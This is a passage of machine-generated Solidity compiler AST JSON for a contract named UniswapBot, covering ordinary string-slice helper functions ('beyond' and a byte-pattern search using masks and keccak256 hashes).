																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 1609,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 613,
																	"src": "11565:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "-=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1610,
																		"name": "needle",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1580,
																		"src": "11578:6:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 1611,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 613,
																	"src": "11578:11:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "11565:24:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1613,
															"nodeType": "ExpressionStatement",
															"src": "11565:24:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1619,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1614,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1578,
																		"src": "11604:4:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 1616,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_ptr",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 615,
																	"src": "11604:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 1617,
																		"name": "needle",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1580,
																		"src": "11617:6:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																			"typeString": "struct UniswapBot.slice memory"
																		}
																	},
																	"id": 1618,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 613,
																	"src": "11617:11:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "11604:24:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1620,
															"nodeType": "ExpressionStatement",
															"src": "11604:24:9"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1623,
													"name": "self",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1578,
													"src": "11660:4:9",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
														"typeString": "struct UniswapBot.slice memory"
													}
												},
												"functionReturnParameters": 1584,
												"id": 1624,
												"nodeType": "Return",
												"src": "11653:11:9"
											}
										]
									},
									"documentation": null,
									"id": 1626,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "beyond",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1581,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1578,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1626,
												"src": "11003:17:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1577,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 616,
													"src": "11003:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$616_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1580,
												"mutability": "mutable",
												"name": "needle",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1626,
												"src": "11022:19:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1579,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 616,
													"src": "11022:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$616_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11002:40:9"
									},
									"returnParameters": {
										"id": 1584,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1583,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1626,
												"src": "11066:12:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
													"typeString": "struct UniswapBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 1582,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 616,
													"src": "11066:5:9",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$616_storage_ptr",
														"typeString": "struct UniswapBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "11065:14:9"
									},
									"scope": 2159,
									"src": "10987:685:9",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1747,
										"nodeType": "Block",
										"src": "11939:1309:9",
										"statements": [
											{
												"assignments": [
													1640
												],
												"declarations": [
													{
														"constant": false,
														"id": 1640,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1747,
														"src": "11950:8:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1639,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "11950:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1642,
												"initialValue": {
													"argumentTypes": null,
													"id": 1641,
													"name": "selfptr",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1630,
													"src": "11961:7:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "11950:18:9"
											},
											{
												"assignments": [
													1644
												],
												"declarations": [
													{
														"constant": false,
														"id": 1644,
														"mutability": "mutable",
														"name": "idx",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1747,
														"src": "11979:8:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1643,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "11979:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1645,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "11979:8:9"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1648,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1646,
														"name": "needlelen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1632,
														"src": "12005:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 1647,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1628,
														"src": "12018:7:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "12005:20:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1742,
												"nodeType": "IfStatement",
												"src": "12001:1205:9",
												"trueBody": {
													"id": 1741,
													"nodeType": "Block",
													"src": "12027:1179:9",
													"statements": [
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1651,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1649,
																	"name": "needlelen",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1632,
																	"src": "12046:9:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 1650,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "12059:2:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "12046:15:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"id": 1739,
																"nodeType": "Block",
																"src": "12716:479:9",
																"statements": [
																	{
																		"assignments": [
																			1708
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1708,
																				"mutability": "mutable",
																				"name": "hash",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1739,
																				"src": "12785:12:9",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1707,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12785:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1709,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12785:12:9"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "12825:43:9",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "12827:39:9",
																					"value": {
																						"arguments": [
																							{
																								"name": "needleptr",
																								"nodeType": "YulIdentifier",
																								"src": "12845:9:9"
																							},
																							{
																								"name": "needlelen",
																								"nodeType": "YulIdentifier",
																								"src": "12856:9:9"
																							}
																						],
																						"functionName": {
																							"name": "keccak256",
																							"nodeType": "YulIdentifier",
																							"src": "12835:9:9"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "12835:31:9"
																					},
																					"variableNames": [
																						{
																							"name": "hash",
																							"nodeType": "YulIdentifier",
																							"src": "12827:4:9"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 1708,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12827:4:9",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1632,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12856:9:9",
																				"valueSize": 1
																			},
																			{
																				"declaration": 1634,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "12845:9:9",
																				"valueSize": 1
																			}
																		],
																		"id": 1710,
																		"nodeType": "InlineAssembly",
																		"src": "12816:52:9"
																	},
																	{
																		"body": {
																			"id": 1737,
																			"nodeType": "Block",
																			"src": "12938:242:9",
																			"statements": [
																				{
																					"assignments": [
																						1724
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 1724,
																							"mutability": "mutable",
																							"name": "testHash",
																							"nodeType": "VariableDeclaration",
																							"overrides": null,
																							"scope": 1737,
																							"src": "12961:16:9",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							},
																							"typeName": {
																								"id": 1723,
																								"name": "bytes32",
																								"nodeType": "ElementaryTypeName",
																								"src": "12961:7:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_bytes32",
																									"typeString": "bytes32"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 1725,
																					"initialValue": null,
																					"nodeType": "VariableDeclarationStatement",
																					"src": "12961:16:9"
																				},
																				{
																					"AST": {
																						"nodeType": "YulBlock",
																						"src": "13009:41:9",
																						"statements": [
																							{
																								"nodeType": "YulAssignment",
																								"src": "13011:37:9",
																								"value": {
																									"arguments": [
																										{
																											"name": "ptr",
																											"nodeType": "YulIdentifier",
																											"src": "13033:3:9"
																										},
																										{
																											"name": "needlelen",
																											"nodeType": "YulIdentifier",
																											"src": "13038:9:9"
																										}
																									],
																									"functionName": {
																										"name": "keccak256",
																										"nodeType": "YulIdentifier",
																										"src": "13023:9:9"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "13023:25:9"
																								},
																								"variableNames": [
																									{
																										"name": "testHash",
																										"nodeType": "YulIdentifier",
																										"src": "13011:8:9"
																									}
																								]
																							}
																						]
																					},
																					"evmVersion": "istanbul",
																					"externalReferences": [
																						{
																							"declaration": 1632,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "13038:9:9",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1640,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "13033:3:9",
																							"valueSize": 1
																						},
																						{
																							"declaration": 1724,
																							"isOffset": false,
																							"isSlot": false,
																							"src": "13011:8:9",
																							"valueSize": 1
																						}
																					],
																					"id": 1726,
																					"nodeType": "InlineAssembly",
																					"src": "13000:50:9"
																				},
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_bytes32",
																							"typeString": "bytes32"
																						},
																						"id": 1729,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1727,
																							"name": "hash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1708,
																							"src": "13076:4:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "==",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 1728,
																							"name": "testHash",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1724,
																							"src": "13084:8:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes32",
																								"typeString": "bytes32"
																							}
																						},
																						"src": "13076:16:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 1732,
																					"nodeType": "IfStatement",
																					"src": "13072:57:9",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"id": 1730,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1640,
																							"src": "13126:3:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"functionReturnParameters": 1638,
																						"id": 1731,
																						"nodeType": "Return",
																						"src": "13119:10:9"
																					}
																				},
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 1735,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 1733,
																							"name": "ptr",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1640,
																							"src": "13152:3:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "+=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 1734,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "13159:1:9",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "13152:8:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 1736,
																					"nodeType": "ExpressionStatement",
																					"src": "13152:8:9"
																				}
																			]
																		},
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1719,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1715,
																				"name": "idx",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1644,
																				"src": "12903:3:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 1718,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1716,
																					"name": "selflen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1628,
																					"src": "12910:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "-",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1717,
																					"name": "needlelen",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1632,
																					"src": "12920:9:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "12910:19:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "12903:26:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"id": 1738,
																		"initializationExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 1713,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 1711,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1644,
																					"src": "12894:3:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "30",
																					"id": 1712,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "12900:1:9",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_0_by_1",
																						"typeString": "int_const 0"
																					},
																					"value": "0"
																				},
																				"src": "12894:7:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 1714,
																			"nodeType": "ExpressionStatement",
																			"src": "12894:7:9"
																		},
																		"loopExpression": {
																			"expression": {
																				"argumentTypes": null,
																				"id": 1721,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "UnaryOperation",
																				"operator": "++",
																				"prefix": false,
																				"src": "12931:5:9",
																				"subExpression": {
																					"argumentTypes": null,
																					"id": 1720,
																					"name": "idx",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1644,
																					"src": "12931:3:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"id": 1722,
																			"nodeType": "ExpressionStatement",
																			"src": "12931:5:9"
																		},
																		"nodeType": "ForStatement",
																		"src": "12889:291:9"
																	}
																]
															},
															"id": 1740,
															"nodeType": "IfStatement",
															"src": "12042:1153:9",
															"trueBody": {
																"id": 1706,
																"nodeType": "Block",
																"src": "12063:647:9",
																"statements": [
																	{
																		"assignments": [
																			1653
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1653,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1706,
																				"src": "12082:12:9",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1652,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12082:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1670,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1668,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "~",
																					"prefix": true,
																					"src": "12105:34:9",
																					"subExpression": {
																						"argumentTypes": null,
																						"components": [
																							{
																								"argumentTypes": null,
																								"commonType": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								},
																								"id": 1666,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"leftExpression": {
																									"argumentTypes": null,
																									"commonType": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									},
																									"id": 1664,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"leftExpression": {
																										"argumentTypes": null,
																										"hexValue": "32",
																										"id": 1656,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "12107:1:9",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_2_by_1",
																											"typeString": "int_const 2"
																										},
																										"value": "2"
																									},
																									"nodeType": "BinaryOperation",
																									"operator": "**",
																									"rightExpression": {
																										"argumentTypes": null,
																										"components": [
																											{
																												"argumentTypes": null,
																												"commonType": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												},
																												"id": 1662,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"leftExpression": {
																													"argumentTypes": null,
																													"hexValue": "38",
																													"id": 1657,
																													"isConstant": false,
																													"isLValue": false,
																													"isPure": true,
																													"kind": "number",
																													"lValueRequested": false,
																													"nodeType": "Literal",
																													"src": "12113:1:9",
																													"subdenomination": null,
																													"typeDescriptions": {
																														"typeIdentifier": "t_rational_8_by_1",
																														"typeString": "int_const 8"
																													},
																													"value": "8"
																												},
																												"nodeType": "BinaryOperation",
																												"operator": "*",
																												"rightExpression": {
																													"argumentTypes": null,
																													"components": [
																														{
																															"argumentTypes": null,
																															"commonType": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															},
																															"id": 1660,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"leftExpression": {
																																"argumentTypes": null,
																																"hexValue": "3332",
																																"id": 1658,
																																"isConstant": false,
																																"isLValue": false,
																																"isPure": true,
																																"kind": "number",
																																"lValueRequested": false,
																																"nodeType": "Literal",
																																"src": "12118:2:9",
																																"subdenomination": null,
																																"typeDescriptions": {
																																	"typeIdentifier": "t_rational_32_by_1",
																																	"typeString": "int_const 32"
																																},
																																"value": "32"
																															},
																															"nodeType": "BinaryOperation",
																															"operator": "-",
																															"rightExpression": {
																																"argumentTypes": null,
																																"id": 1659,
																																"name": "needlelen",
																																"nodeType": "Identifier",
																																"overloadedDeclarations": [],
																																"referencedDeclaration": 1632,
																																"src": "12123:9:9",
																																"typeDescriptions": {
																																	"typeIdentifier": "t_uint256",
																																	"typeString": "uint256"
																																}
																															},
																															"src": "12118:14:9",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														}
																													],
																													"id": 1661,
																													"isConstant": false,
																													"isInlineArray": false,
																													"isLValue": false,
																													"isPure": false,
																													"lValueRequested": false,
																													"nodeType": "TupleExpression",
																													"src": "12117:16:9",
																													"typeDescriptions": {
																														"typeIdentifier": "t_uint256",
																														"typeString": "uint256"
																													}
																												},
																												"src": "12113:20:9",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											}
																										],
																										"id": 1663,
																										"isConstant": false,
																										"isInlineArray": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"nodeType": "TupleExpression",
																										"src": "12112:22:9",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"src": "12107:27:9",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"nodeType": "BinaryOperation",
																								"operator": "-",
																								"rightExpression": {
																									"argumentTypes": null,
																									"hexValue": "31",
																									"id": 1665,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "number",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "12137:1:9",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_rational_1_by_1",
																										"typeString": "int_const 1"
																									},
																									"value": "1"
																								},
																								"src": "12107:31:9",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							}
																						],
																						"id": 1667,
																						"isConstant": false,
																						"isInlineArray": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"nodeType": "TupleExpression",
																						"src": "12106:33:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 1655,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "12097:7:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_bytes32_$",
																					"typeString": "type(bytes32)"
																				},
																				"typeName": {
																					"id": 1654,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12097:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1669,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "12097:43:9",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_bytes32",
																				"typeString": "bytes32"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12082:58:9"
																	},
																	{
																		"assignments": [
																			1672
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 1672,
																				"mutability": "mutable",
																				"name": "needledata",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 1706,
																				"src": "12162:18:9",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 1671,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "12162:7:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 1673,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "12162:18:9"
																	},
																	{
																		"AST": {
